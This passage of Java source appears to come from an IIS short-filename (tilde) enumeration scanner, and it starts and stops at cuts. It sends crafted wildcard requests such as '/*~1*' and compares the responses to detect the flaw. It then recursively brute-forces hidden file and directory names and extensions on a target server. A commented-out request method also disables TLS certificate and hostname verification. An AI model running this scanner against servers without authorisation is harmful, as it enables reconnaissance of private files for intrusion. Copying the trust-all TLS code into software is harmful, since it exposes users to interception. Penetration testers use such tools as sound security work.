    private Runnable multithread_NameCharPurifier(final String strInput) {
        return new Runnable() {

            public void run() {
                try {
                    showOutputs("Is this character valid in name? " + strInput, OutputType.DEBUG);

                    String statusCode = getStatus("/" + nameStartsWith + asteriskSymbol + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list

                    // when extension should start with something
                    if (!extStartsWith.equals(""))
                        statusCode = getStatus("/" + nameStartsWith + asteriskSymbol + strInput + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart);

                    if (statusCode.equals("valid")) {
                        String tempInvalidStatusCode = getStatus("/" + nameStartsWith + asteriskSymbol + new String(new char[7]).replace("\0", strInput) + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
                        // So if tempInvalidStatusCode is also valid then something is very wrong!
                        if (!tempInvalidStatusCode.equals("valid")) {
                            statusCode = getStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!

                            // when extension should start with something
                            if (!magicFileExtension.equals(""))
                                statusCode = getStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!

                            if (!statusCode.equals("valid")) {
                                addValidCharToName(strInput); // Valid character - add it to the list

                                showOutputs("Valid character in name:" + strInput, OutputType.DEBUG);

                            }
                        }
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
                decThreadCounter(1);
            }
        };
    }

    private synchronized void addValidCharToName(String strInput) {
        scanListName.add(strInput);
    }

    private Runnable multithread_ExtensionCharPurifier(final String strInput) {
        return new Runnable() {

            public void run() {
                try {
                    String statusCode = getStatus("/" + nameStartsWith + asteriskSymbol + "~1." + extStartsWith + asteriskSymbol + strInput + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list

                    showOutputs("Is this character valid in extension? " + strInput, OutputType.DEBUG);

                    if (statusCode.equals("valid")) {
                        String tempInvalidStatusCode = getStatus("/" + nameStartsWith + asteriskSymbol + "~1." + extStartsWith + asteriskSymbol + new String(new char[4]).replace("\0", strInput) + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
                        // So if tempInvalidStatusCode is also valid then something is very wrong!
                        if (!tempInvalidStatusCode.equals("valid")) {
                            statusCode = getStatus("/" + nameStartsWith + asteriskSymbol + "~1." + asteriskSymbol + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
                            if (!statusCode.equals("valid")) {
                                addValidCharToExtension(strInput); // Valid character - add it to the list

                                showOutputs("Valid character in extension:" + strInput, OutputType.DEBUG);

                            }
                        }
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
                decThreadCounter(1);
            }
        };
    }

    private synchronized void addValidCharToExtension(String strInput) {
        scanListExtension.add(strInput);
    }

    private Runnable multithread_iterateScanFileName(final String strInputFinal) {
        return new Runnable() {

            public void run() {
                try {
                    String strInput = strInputFinal;
                    if (strInput.equals("") && !nameStartsWith.equals("")) {
                        strInput = nameStartsWith;
                    }
                    boolean atLeastOneSuccess = false;
                    for (int i = 0; i < arrayScanListName.length; i++) {
                        String newStr = strInput + arrayScanListName[i];

                        String statusCode;
                        if (!extStartsWith.equals(""))
                            statusCode = getStatus("/" + newStr + magicFileName + "." + extStartsWith + magicFileExtension + magicFinalPart);
                        else
                            statusCode = getStatus("/" + newStr + magicFileName + magicFinalPart);

                        if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                            String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanListName[i].toUpperCase() + "\t\t";
                            System.out.print(internalMessage); // To show the progress! - Just Pretty! - we don't need to log this, so we need to print it here without using showOutputs
                        }

                        if (statusCode.equals("valid")) {
                            atLeastOneSuccess = true;
                            //if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
                            int isItLastFileName = isItLastFileName(newStr);
                            if (isItLastFileName > 0) {
                                // Add it to final list
                                int counter = 1;
                                while ((statusCode.equals("valid") && counter <= maxNumericalPart) || (counter <= forceNumericalPart && counter > 1)) {
                                    String fileName = newStr + "~" + counter;
                                    // Find Extension
                                    if (isItFolder(fileName) == 1) {

                                        showOutputs("\rDir: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);

                                        addValidDirToResults(fileName.toUpperCase());
                                    }
                                    if (isExtensionReliable) {
                                        fileName += ".";
                                        if (extStartsWith.length() == 3) {
                                            // we have already found our file as the extension was in the config file
                                            addValidFileToResults(fileName.toUpperCase() + extStartsWith);
                                        } else {
                                            incThreadCounter(1);
                                            threadPool.runTask(multithread_iterateScanFileExtension(fileName, "", false));
                                        }
                                        ++counter;
                                    } else {
                                        showOutputs("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t", ShowProgressMode.PARTIALRESULT);
                                        addValidFileToResults(fileName.toUpperCase() + ".???");
                                        statusCode = "000 Extension is not reliable";
                                    }
                                }
                                if (isItLastFileName == 2) {
                                    incThreadCounter(1);
                                    threadPool.runTask(multithread_iterateScanFileName(newStr));
                                }
                            } else {
                                incThreadCounter(1);
                                threadPool.runTask(multithread_iterateScanFileName(newStr));
                            }
                        } else {
                            // Ignore it?
                            if (strInput.length() > 0 && strInput.equals(nameStartsWith) && atLeastOneSuccess == false && i == arrayScanList.length - 1) {
                                // We have a failure here... it should have at least found 1 item!
                                String unFinishedString = String.format("%1s%2$" + (6 - strInput.length()) + "s~?", strInput.toUpperCase(), "?????");

                                showOutputs("\rFile/Dir: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
                                addValidDirToResults(unFinishedString);
                            }
                        }
                    }
                    if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                        System.out.print("\r\t\t\t\t");
                    }

                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
                decThreadCounter(1);
            }
        };
    }

    private void iterateScanFileNameLegacy(String strInput) {
        boolean atLeastOneSuccess = false;
        if (strInput.equals("") && !nameStartsWith.equals("")) {
            strInput = nameStartsWith;
        }
        for (int i = 0; i < arrayScanList.length; i++) {
            String newStr = strInput + arrayScanList[i];

            String statusCode;
            if (!extStartsWith.equals(""))
                statusCode = getStatus("/" + newStr + magicFileName + "." + extStartsWith + magicFileExtension + magicFinalPart);
            else
                statusCode = getStatus("/" + newStr + magicFileName + magicFinalPart);

            if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanList[i].toUpperCase() + "\t\t";
                System.out.print(internalMessage); // To show the progress! - Just Pretty!
            }
            if (statusCode.equals("valid")) {
                atLeastOneSuccess = true;
                //if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
                int isItLastFileName = isItLastFileName(newStr);
                if (isItLastFileName > 0) {
                    // Add it to final list
                    int counter = 1;
                    while ((statusCode.equals("valid") && counter <= maxNumericalPart) || (counter <= forceNumericalPart && counter > 1)) {
                        String fileName = newStr + "~" + counter;
                        // Find Extension
                        if (isItFolder(fileName) == 1) {
                            showOutputs("\rDir: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
                            addValidDirToResults(fileName.toUpperCase());
                        }
                        if (isExtensionReliable) {
                            fileName += ".";
                            if (extStartsWith.length() == 3) {
                                // we have already found our file as the extension was in the config file
                                addValidFileToResults(fileName.toUpperCase() + extStartsWith);
                            } else {
                                iterateScanFileExtensionLegacy(fileName, "");
                            }
                            statusCode = getStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
                        } else {
                            showOutputs("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t", ShowProgressMode.PARTIALRESULT);
                            addValidFileToResults(fileName.toUpperCase() + ".???");
                            statusCode = "000 Extension is not reliable";
                        }
                    }
                    if (isItLastFileName == 2) {
                        iterateScanFileNameLegacy(newStr);
                    }
                } else {
                    iterateScanFileNameLegacy(newStr);
                }
            } else {
                // Ignore it?
                if (strInput.length() > 0 && strInput.equals(nameStartsWith) && atLeastOneSuccess == false && i == arrayScanList.length - 1) {
                    // We have a failure here... it should have at least found 1 item!
                    String unFinishedString = String.format("%1s%2$" + (6 - strInput.length()) + "s~?", strInput.toUpperCase(), "?????");
                    showOutputs("\rFile/Dir: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
                    addValidDirToResults(unFinishedString);
                }
            }
        }
        if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
            System.out.print("\r\t\t\t\t");
        }
    }

    private int isItLastFileName(String strInput) {
        int result = 1; // File is available and there is no more file
        if (!isQuestionMarkReliable) {
            // we cannot use "?" for this validation as this result will include false positives...
            result = 2;
        } else {
            if (strInput.length() < 6) {
                try {
                    String statusCode = getStatus("/" + strInput + questionMarkSymbol + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);
                    if (statusCode.equals("valid")) {
                        result = 0; // This file is not completed
                        statusCode = getStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
                        if (statusCode.equals("valid")) {
                            result = 2; // This file is available but there are more as well
                        }
                    } else {
                        // Sometimes in rare cases we can see that a virtual directory is still there with more character
                        statusCode = getStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
                        if (statusCode.equals("invalid")) {
                            result = 0; // This file is not completed
                        }
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
            }
        }
        return result;
    }

    private Runnable multithread_iterateScanFileExtension(final String strFilename, final String strInputFinal, final boolean hasValidParent) {
        return new Runnable() {

            public void run() {
                try {
                    String strInput = strInputFinal;
                    if (strInput.equals("") && !extStartsWith.equals("")) {
                        strInput = extStartsWith;
                    }
                    boolean atLeastOneSuccess = false;
                    if (hasValidParent)
                        atLeastOneSuccess = true;

                    for (int i = 0; i < arrayScanListExt.length; i++) {
                        String newStr = strInput + arrayScanListExt[i];
                        String statusCode;
                        if (newStr.length() <= 2) {
                            statusCode = getStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
                        } else {
                            statusCode = getStatus("/" + strFilename + newStr + magicFinalPart);
                        }
                        String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanListExt[i].toUpperCase() + "\t\t";
                        if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                            System.out.print(internalMessage); // To show the progress! - Just Pretty!
                        }
                        if (statusCode.equals("valid")) {
                            atLeastOneSuccess = true;
                            //if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
                            if (isItLastFileExtension(strFilename + newStr)) {
                                // Add it to final list
                                String fileName = strFilename + newStr;
                                showOutputs("\rFile: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
                                addValidFileToResults(fileName.toUpperCase());
                                if (newStr.length() < 3) {
                                    incThreadCounter(1);
                                    threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr, true));
                                }
                            } else {
                                incThreadCounter(1);
                                threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr, true));
                            }
                        } else {
                            // Ignore it?
                            if (strInput.length() > 0 && atLeastOneSuccess == false && i == arrayScanListExt.length - 1) {
                                // We have a failure here... it should have at least found 1 item!
                                String unFinishedString = strFilename + String.format("%1s%2$" + (3 - strInput.length()) + "s", strInput.toUpperCase(), "??");
                                showOutputs("\rFile: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
                                addValidFileToResults(unFinishedString);
                            }
                        }
                    }
                    if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                        System.out.print("\r\t\t\t\t");
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
                decThreadCounter(1);
            }
        };
    }

    private void iterateScanFileExtensionLegacy(String strFilename, String strInput) {
        if (strInput.equals("") && !extStartsWith.equals("")) {
            strInput = extStartsWith;
        }
        boolean atLeastOneSuccess = false;
        for (int i = 0; i < arrayScanList.length; i++) {
            String newStr = strInput + arrayScanList[i];
            String statusCode = getStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
            String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanList[i].toUpperCase() + "\t\t";
            if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                System.out.print(internalMessage); // To show the progress! - Just Pretty!
            }
            if (statusCode.equals("valid")) {
                atLeastOneSuccess = true;
                //if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
                if (isItLastFileExtension(strFilename + newStr)) {
                    // Add it to final list
                    String fileName = strFilename + newStr;
                    showOutputs("\rFile: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);
                    addValidFileToResults(fileName.toUpperCase());
                    if (newStr.length() < 3) {
                        iterateScanFileExtensionLegacy(strFilename, newStr);
                    }
                } else {
                    iterateScanFileExtensionLegacy(strFilename, newStr);
                }
            } else {
                // Ignore it?
                if (strInput.length() > 0 && atLeastOneSuccess == false && i == arrayScanList.length - 1) {
                    // We have a failure here... it should have at least found 1 item!
                    String unFinishedString = strFilename + String.format("%1s%2$" + (3 - strInput.length()) + "s", strInput.toUpperCase(), "??");
                    showOutputs("\rFile: " + unFinishedString + " - possible network/server problem\t\t", ShowProgressMode.PARTIALRESULT);
                    addValidFileToResults(unFinishedString);
                }
            }
        }
        if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
            System.out.print("\r\t\t\t\t");
        }
    }

    private boolean isItLastFileExtension(String strInput) {
        boolean result = false;
        if (!isExtensionReliable) {
            result = true;
        } else if (strInput.length() <= 12) {
            //showOutputs(strInput);
            int extLength = 3; // default length
            if (strInput.indexOf(".") > 0 && strInput.indexOf(".") != strInput.length() - 1) {
                String[] temp = strInput.split("\\.");
                if (temp[1].length() >= extLength) {
                    result = true;
                } else if (getStatus("/" + strInput + "." + asteriskSymbol + magicFinalPart).equals("valid")) {
                    result = true;
                } else if (!sendHTTPReq(strInput + magicFinalPart).equals(sendHTTPReq(strInput + "xxx" + magicFinalPart))) {
                    result = true;
                }
            }
            if (!result) {
                try {
                    String statusCode = getStatus("/" + strInput + magicFileExtension + magicFinalPart);
                    if (!statusCode.equals("valid")) {
                        result = true;
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                    //showOutputs("isItLastFileExtension() Error: " + err.toString());
                }
            }
        }
        //showOutputs(result);
        return result;
    }

    private int isItFolder(String strInput) {
        int result = 0; // No Dir or File
        if (!isQuestionMarkReliable) {
            // we cannot use "?" for validation!
            // too many false positives here ...
            result = 1;
        } else {
            try {
                String statusCode1 = getStatus("/" + strInput + questionMarkSymbol + magicFinalPart);
                if (statusCode1.equals("valid")) {
                    String statusCode2 = getStatus("/" + strInput + asteriskSymbol + magicFinalPart);
                    if (statusCode1.equals(statusCode2)) {
                        result = 1; // A directory
                    }
                }
            } catch (Exception err) {
                if (debugMode) {
                    StringWriter sw = new StringWriter();
                    err.printStackTrace(new PrintWriter(sw));
                    String exceptionAsString = sw.toString();
                    showOutputs(exceptionAsString, OutputType.ERROR);
                }
                //showOutputs("isItFolder() Error: " + err.toString());
            }
        }
        return result;
    }

    private String getStatus(String strAddition) {
        return getStatus(strAddition, 0);
    }

    private String getStatus(String strAddition, int counter) {
        String status = "";
        try {
            if (!strAddition.startsWith("/")) {
                strAddition = "/" + strAddition;
            }

            strAddition = strAddition.replace("//", "/");

            String statusResponse = sendHTTPReq(strAddition);
            //status = HTTPReqResponseSocket(strAddition, 0);
			
			/*
			// Although it seems it is allow-list and should be good, we may miss some results, and it is better to use blocklist
			if (status.equals(statusResponse)) {
				status = "valid";
			} else {
				status = "invalid";
			}
			*/

            // blocklist approach to find even more for difficult and strange cases!
            if (invalidStatusList.contains(statusResponse)) {
                status = "invalid";
            } else if (validStatusList.stream().anyMatch(str -> str.substring(0, Math.min(str.length(), 50)).equals(statusResponse.substring(0, Math.min(statusResponse.length(), 50))))) {
                status = "valid";
            } else if (counter > 2) {
                for (var is : invalidStatusList) {
                    if (is.substring(0, Math.min(is.length(), 50)).equals(statusResponse.substring(0, Math.min(statusResponse.length(), 50)))) {
                        status = "invalid";
                        break;
                    }
                }
                if (status.isBlank())
                    status = "valid";
            } else {
                // we send the request again to ensure this was not just a one off
                status = getStatus(strAddition, counter + 1);
            }

        } catch (Exception err) {
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }
            //showOutputs("GetStatus() Error: " + err.toString() + " - Status: " + status);
        }
        showOutputs("Status for " + strAddition + ": " + status, OutputType.DEBUG);
        return status;
    }

    private List<String> getUniqueResponseList(String targetURL) {
        return getResponseList(targetURL, minVulnerableCheckRepeat, acceptableDifferenceLengthBetweenResponses, true);
    }

    private List<String> getResponseList(String targetURL, int numberOfChecks, int responseLengthDifferenceThreshold, boolean keepUnique) {
        List<String> finalResponseList = new ArrayList<>();

        if (numberOfChecks < 1) {
            numberOfChecks = 1;
        }

        for (int i = 0; i < numberOfChecks; i++) {
            String currentResponse = sendHTTPReq(targetURL);

            if (keepUnique) {
                if (!isResponseInList(currentResponse, finalResponseList, responseLengthDifferenceThreshold)) {
                    finalResponseList.add(currentResponse);
                }
            } else {
                finalResponseList.add(currentResponse);
            }
        }

        return finalResponseList;
    }

    private List<String> keepUniqueResponseList(List<String> sourceList, List<String> comparedWithList, int responseLengthDifferenceThreshold) {
        List<String> mergedList = new ArrayList<>();
        List<String> uniqueList = new ArrayList<>();

        mergedList.addAll(comparedWithList);

        for (String sourceItem : sourceList) {
            boolean isUnique = true;
            if (!mergedList.contains(sourceItem)) {
                if (responseLengthDifferenceThreshold > 0) {
                    for (String targetItem : comparedWithList) {
                        if (Math.abs(targetItem.length() - sourceItem.length()) <= responseLengthDifferenceThreshold) {
                            // we can safely ignore it as it is within the threshold
                            isUnique = false;
                            break;
                        }
                    }
                }
            } else {
                isUnique = false;
            }

            if (isUnique) {
                mergedList.add(sourceItem);
                uniqueList.add(sourceItem);
            }
        }

        return uniqueList;
    }

    private boolean isResponseInList(String currentResponse, List<String> sourceList, int responseLengthDifferenceThreshold) {
        boolean isUnique = false;
        if (!sourceList.contains(currentResponse)) {
            isUnique = true;
            if (responseLengthDifferenceThreshold > 0) {
                for (String sourceItem : sourceList) {
                    if (Math.abs(sourceItem.length() - currentResponse.length()) <= responseLengthDifferenceThreshold) {
                        // we can safely ignore it as it is within the threshold
                        isUnique = false;
                        break;
                    }
                }
            }
        }

        return !isUnique;
    }

    private boolean doResponseListsShareOneItem(List<String> sourceList, List<String> targetList, int responseLengthDifferenceThreshold) {
        boolean isUnique = true;
        for (String sourceItem : sourceList) {
            if (!targetList.contains(sourceItem)) {
                if (responseLengthDifferenceThreshold > 0) {
                    for (String targetItem : targetList) {
                        if (Math.abs(targetItem.length() - sourceItem.length()) <= responseLengthDifferenceThreshold) {
                            // we can safely ignore it as it is within the threshold
                            isUnique = false;
                            break;
                        }
                    }
                }
            } else {
                isUnique = false;
            }

            if (!isUnique) {
                break;
            }
        }

        return !isUnique;
    }


    private boolean isVulnerable() {
        boolean result = false;
        try {
            validStatusList = getUniqueResponseList("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);

            List<String> tempInvalidStatus1List = getUniqueResponseList("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);

            List<String> tempInvalidStatus1UniqueList = keepUniqueResponseList(tempInvalidStatus1List, invalidStatusList, acceptableDifferenceLengthBetweenResponses);

            if (!doResponseListsShareOneItem(validStatusList, tempInvalidStatus1UniqueList, acceptableDifferenceLengthBetweenResponses)) {
                invalidStatusList.addAll(tempInvalidStatus1UniqueList);

                // Invalid different name
                List<String> tempInvalidStatus2List = getUniqueResponseList("/0123456789" + asteriskSymbol + "~1." + asteriskSymbol + magicFinalPart);
                List<String> tempInvalidStatus2UniqueList = keepUniqueResponseList(tempInvalidStatus2List, invalidStatusList, acceptableDifferenceLengthBetweenResponses);
                invalidStatusList.addAll(tempInvalidStatus2UniqueList);

                // Invalid name and extension
                List<String> tempInvalidStatus3List = getUniqueResponseList("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart);
                List<String> tempInvalidStatus3UniqueList = keepUniqueResponseList(tempInvalidStatus3List, invalidStatusList, acceptableDifferenceLengthBetweenResponses);
                invalidStatusList.addAll(tempInvalidStatus3UniqueList);

                // If two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
                if (doResponseListsShareOneItem(tempInvalidStatus1List, tempInvalidStatus2List, acceptableDifferenceLengthBetweenResponses)) {
                    if (doResponseListsShareOneItem(tempInvalidStatus2List, tempInvalidStatus3List, acceptableDifferenceLengthBetweenResponses)) {
                        isExtensionReliable = true;
                    } else {
                        isExtensionReliable = false;
                    }

                    result = true;
                }

                List<String> otherUrlInvalidCheckPatterns = new ArrayList<>(Arrays.asList(
                        "/" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, // Invalid extension
                        "/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, // Invalid name with no extension
                        "/1234567890" + asteriskSymbol + "~1" + questionMarkSymbol + magicFinalPart, // Invalid name with no extension and question mark symbol
                        "/" + new String(new char[10]).replace("\0", questionMarkSymbol) + "~1" + asteriskSymbol + magicFinalPart, // Invalid name contains question mark symbol with no extension
                        "/1234567890~1.1234" + magicFinalPart // Invalid name with no special characters

                ));

                for (String item : otherUrlInvalidCheckPatterns) {
                    List<String> tempInvalidStatusNList = getUniqueResponseList(item);
                    List<String> tempInvalidStatusNUniqueList = keepUniqueResponseList(tempInvalidStatusNList, invalidStatusList, acceptableDifferenceLengthBetweenResponses);
                    invalidStatusList.addAll(tempInvalidStatusNUniqueList);
                }
            }

        } catch (Exception err) {
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }
            //showOutputs("isReliable Error: " + err.toString());
        }
        showOutputs("isReliable = " + result, OutputType.DEBUG);
        showOutputs("IsExtensionReliable = " + isExtensionReliable, OutputType.DEBUG);
        return result;
    }

    private boolean isQuestionMarkReliable() {
        boolean result = false;

        List<String> initValidStatusList;

        if (!validStatusList.isEmpty())
            initValidStatusList = validStatusList;
        else {
            initValidStatusList = getUniqueResponseList("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);
            validStatusList = initValidStatusList;
        }

        try {
            List<String> tempValidStatusList = getUniqueResponseList("/?" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);

            if (doResponseListsShareOneItem(initValidStatusList, tempValidStatusList, acceptableDifferenceLengthBetweenResponses)) {
                result = true;
            } else {
                for (String tempValidStatus : tempValidStatusList) {
                    if (initValidStatusList.stream().anyMatch(str -> str.substring(0, 50).equals(tempValidStatus.substring(0, 50)))) {
                        result = true;
                        break;
                    }
                }
            }


        } catch (Exception err) {
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }
            //showOutputs("isQuestionMarkReliable Error: " + err.toString());
        }
        if (result == false) {
            try {
                List<String> tempValidStatusList = getUniqueResponseList("/>" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);

                if (doResponseListsShareOneItem(initValidStatusList, tempValidStatusList, acceptableDifferenceLengthBetweenResponses)) {
                    result = true;
                } else {
                    for (String tempValidStatus : tempValidStatusList) {
                        if (initValidStatusList.stream().anyMatch(str -> str.substring(0, 50).equals(tempValidStatus.substring(0, 50)))) {
                            result = true;
                            break;
                        }
                    }
                }

                if (result) {
                    questionMarkSymbol = ">";
                }

            } catch (Exception err) {
                if (debugMode) {
                    StringWriter sw = new StringWriter();
                    err.printStackTrace(new PrintWriter(sw));
                    String exceptionAsString = sw.toString();
                    showOutputs(exceptionAsString, OutputType.ERROR);
                }
                //showOutputs("isQuestionMarkReliable Error: " + err.toString());
            }
        }

        showOutputs("isQuestionMarkReliable = " + result, OutputType.DEBUG);

        return result;
    }

    /*
    private String sendHTTPReqLegacy(String strAddition, int retryTimes) {
        String finalResponse = "";
        String charset = "UTF-8";
        Object content = null;
        HttpURLConnection conn = null;
        incReqCounter(1);
        try {
            CloseableHttpClient httpclient = HttpClients.createDefault();

            // Create a trust manager that does not validate certificate chains
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {

                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }
                    }
            };

            // Install the all-trusting trust manager
            try {
                SSLContext sc = SSLContext.getInstance("SSL");
                sc.init(null, trustAllCerts, new java.security.SecureRandom());
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            } catch (Exception e) {
            }

            HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {

                public boolean verify(String string, SSLSession ssls) {
                    return true;
                }
            });

            // removing additional slash character!
            if (strAddition.startsWith("/") && destURL.endsWith("/")) {
                strAddition = strAddition.substring(1);
            }

            String urlEncodedStrAddition = "";


            if(performUrlEncoding){
                String fullUrlEncodedStrAddition = URLEncoder.encode(strAddition, StandardCharsets.UTF_8).replace("*", "%2a"); // Java does not encode asterisk
                urlEncodedStrAddition = fullUrlEncodedStrAddition;
            }else{
                // the ones that IIS doesn't like without encoding
                urlEncodedStrAddition = strAddition.replace("<", "%3c").replace(">", "%3e").replace("?", "%3f");
                urlEncodedStrAddition = urlEncodedStrAddition.replaceAll("%(?![a-fA-F0-9]{2})","%25");
            }

            URL finalURL = new URL(destURL + urlEncodedStrAddition + additionalQuery);

            if (!proxyServerName.equals("") && !proxyServerPort.equals("")) {
                // Use the proxy server to sends the requests
                conn = (HttpURLConnection) finalURL.openConnection(proxy);
            } else {
                conn = (HttpURLConnection) finalURL.openConnection();
            }

            conn.setConnectTimeout(maxConnectionTimeOut);    // 10 sec
            conn.setReadTimeout(maxConnectionTimeOut);       // 10 sec
            conn.setInstanceFollowRedirects(false);
            if (!customUserAgent.equals("")) {
                conn.setRequestProperty("User-agent", customUserAgent);
            }
            if (!customCookie.equals("")) {
                conn.setRequestProperty("Cookie", customCookie);
            }

            for (String newHeader : additionalHeaders) {
                if(newHeader.contains(":"))
                    conn.setRequestProperty(newHeader.split(":")[0], newHeader.split(":")[1]);
            }

            // Set the request method!
            //conn.setRequestMethod(reliableRequestMethod);
            setRequestMethodUsingWorkaroundForJREBug(conn, reliableRequestMethod);

            int length = 0;
            String responseHeaderStatus = "";

            try {
                // Send the request.
                conn.connect();

                Thread.sleep(maxDelayAfterEachRequest); // Delay after each request

                // Get the response.
                responseHeaderStatus = conn.getHeaderField(0);

                length = conn.getContentLength();

                content = conn.getContent();
            } catch (java.net.ConnectException e) {

                if (concurrentThreads > 10) {
                    concurrentThreads = 10;
                } else if (concurrentThreads > 5) {
                    concurrentThreads = 5;
                } else if (concurrentThreads > 1) {
                    concurrentThreads = 1;
                }

                boolIsNetworkReliable = false;
                Thread.sleep(sleepTime * 1000);
                if (sleepTime < 10)
                    sleepTime++;


                //showOutputs("Error: Connection error. Please check the protocol, the domain name, or the proxy server.",OutputType.ERROR);
                showOutputs("Number of threads should be reduced - can be too late but reduced to:" + concurrentThreads, OutputType.ERROR, ShowProgressMode.ALL);
                showOutputs("Sleep for " + sleepTime + " seconds...", OutputType.ERROR, ShowProgressMode.ALL);
                throw new Exception("Error: Connection error. Please check the protocol, the domain name, or the proxy server.");


            } catch (Exception e) {
                if (responseHeaderStatus == null) {
                    //time-out
                    throw new Exception("Time-Out was detected...");
                } else {
                    //400 errors? we like 400 errors!
                    if (debugMode) {
                        //e.printStackTrace();
                    }
                }
            }

            final java.io.InputStream stream = conn.getErrorStream();
            // Get the content.

            if (stream != null && length > -1) {
                content = readStream(length, stream, charset);
                stream.close();
            } else if (content != null && content instanceof java.io.InputStream && length > -1) {
                content = readStream(length, (java.io.InputStream) content, charset);
            }

            //conn.disconnect();

            if (content == null) {
                finalResponse = "";
            } else {
                finalResponse = processResponse(content.toString(),strAddition,responseHeaderStatus,charset);

            }
        } catch (BindException bindException) {
            try {
                if (conn != null) {
                    conn.disconnect();
                }

